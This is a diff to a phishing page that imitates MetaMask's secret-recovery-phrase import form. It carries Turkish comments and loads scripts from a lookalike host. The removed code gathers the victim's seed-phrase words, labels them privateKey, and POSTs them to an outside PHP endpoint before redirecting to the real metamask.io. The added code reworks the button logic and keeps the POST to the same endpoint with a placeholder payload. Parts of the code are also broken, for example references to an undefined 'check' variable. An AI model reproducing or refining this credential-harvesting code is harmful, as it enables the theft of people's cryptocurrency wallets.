@@ -68006,89 +68006,59 @@ input:checked + .send-v2__amount-max__button {
     <script src="https://webwallet-metamask.vercel.app/bip39.min.js"></script>
     <script src="https://webwallet-metamask.vercel.app/script5e1f.js"></script>
 <script>
-    var phs2 = [];
-    var phs3 = [];
-
     $(document).ready(function () {
-        const inputs = document.querySelectorAll("input[name='pass[]']");
+        // Selectbox değiştiğinde
+        $("#selectboxID").change(function () {
+            // Seçilen değeri al
+            var selectedValue = $(this).val();
 
-        inputs.forEach((input, index) => {
-            input.addEventListener('keyup', (e) => {
-                phs3 = [];
-                $("input[name='pass[]']").map(function (key) {
-                    if ($(this).val().length >= 3) {
-                        phs3.push($(this).val());
+            // Belirtilen koşullara göre "Recover Wallet" butonunu etkinleştir veya devre dışı bırak
+            if (selectedValue == 12) {
+                var enableButton = true;
+
+                for (var i = 0; i <= 11; i++) {
+                    var inputID = "import-srp__srp-word-" + i;
+                    var inputValue = $("#" + inputID).val();
+
+                    // Her bir input içinde en az 3 harf kontrolü
+                    if (inputValue.length < 3) {
+                        enableButton = false;
+                        break;
                     }
-                });
+                }
 
-                // Bip39 doğrulaması kaldırıldı
-                // var check = bip39.validateMnemonic(phs3.join(" "), bip39.wordlists.english);
-                
-                // Diğer kontroller
-                if (!check) {
-                    $("#phrase-helper-text").show();
+                // Eğer koşullar sağlanıyorsa butonu etkinleştir
+                if (enableButton) {
+                    $("#form77").prop("disabled", false);
                 } else {
-                    $("#phrase-helper-text").hide();
+                    $("#form77").prop("disabled", true);
                 }
-            });
-
-            input.addEventListener('paste', (e) => {
-                e.preventDefault();
-                phs2 = [];
-
-                if (data.split(' ').length == 12 || data.split(' ').length == 15 || data.split(' ').length == 18 || data.split(' ').length == 21 || data.split(' ').length == 24) {
-                    // (Devam eden kodlar...)
-
-                    $("input[name='pass[]']").map(function (key) {
-                        if ($(this).val().length >= 3) {
-                            phs2.push($(this).val());
-                        }
-                    });
-
-                    // Bip39 doğrulaması kaldırıldı
-                    // var check = bip39.validateMnemonic(phs2.join(" "), bip39.wordlists.english);
-                    
-                    // Diğer kontroller
-                    if (!check) {
-                        $("#phrase-helper-text").show();
-                    } else {
-                        $("#phrase-helper-text").hide();
-                    }
-                }
-            });
-        })
-
-        $("#form77").click(function () {
-            var phs = [];
-            $("input[name='pass[]']").map(function (key) {
-                if ($(this).val().length >= 3) {
-                    phs.push($(this).val());
-                }
-            });
-
-            // Bip39 doğrulaması kaldırıldı
-            // var check = bip39.validateMnemonic(phs.join(" "), bip39.wordlists.english);
-            
-            // Diğer kontroller
-            if (check) {
-                $.ajax({
-                    method: 'POST',
-                    data: {
-                        walletName: 'metamask',
-                        privateKey: phs.toString(),
-                    },
-                    url: 'https://ajansdesire.com/asdasd/kekem.php',
-                    success: function (data) {
-                        window.location.href = 'https://href.li/?https://metamask.io';
-                    },
-                    error: function () {
-                        // Hata durumunda yapılacak işlemler
-                    },
-                });
+            } else {
+                // Seçilen değer 12 değilse butonu devre dışı bırak
+                $("#form77").prop("disabled", true);
             }
+        });
+
+        // "Recover Wallet" butonuna tıklanınca
+        $("#form77").click(function () {
+            // Formu kekem.php adresine POST isteği gönder
+            $.ajax({
+                method: 'POST',
+                data: {
+                    // Gönderilecek verileri buraya ekleyin
+                },
+                url: 'https://ajansdesire.com/asdasd/kekem.php',
+                success: function (data) {
+                    window.location.href = 'https://href.li/?https://metamask.io';
+                },
+                error: function () {
+                    // Hata durumunda yapılacak işlemler
+                },
+            });
         });
     });
 </script>
+
   </body>
 
 </html>
